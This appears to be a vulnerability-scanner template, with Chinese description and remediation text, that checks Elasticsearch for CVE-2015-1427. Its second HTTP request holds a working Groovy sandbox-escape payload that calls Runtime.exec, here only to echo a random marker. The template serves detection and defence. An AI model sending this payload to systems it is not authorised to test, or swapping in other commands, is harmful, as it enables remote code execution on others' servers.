id: CVE-2015-1427
info:
  name: ElasticSearch - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Elasticsearch Groovy Scripting Engine Sandbox 安全绕过漏洞
    ElasticSearch是一个基于Lucene构建的开源，分布式，RESTful搜索引擎。
    Elasticsearch Groovy脚本引擎沙盒存在安全绕过漏洞，攻击者可利用此漏洞绕过某些安全限制执行未授权操作。
  severity: critical
  remediation: |-
    官方修复建议：
    建议升级该组件至最新版本。
    https://github.com/elasticsearch

    临时修复建议：
    临时修复方案：<br/>1、前后端同时对用户输入信息进行校验，双重验证机制。<br/>2、调用功能前验证用户是否有权限调用相关功能。
requests:
- matchers:
  - type: word
    part: header
    words:
    - application/json
  - type: word
    part: body
    words:
    - '{{randstr}}'
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /website/blog/ HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Language: en
    Content-Type: application/x-www-form-urlencoded

    {
      "name": "test"
    }
  - |
    POST /_search HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Content-Type: application/x-www-form-urlencoded

    {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"echo {{randstr}}\").getText()"}}}
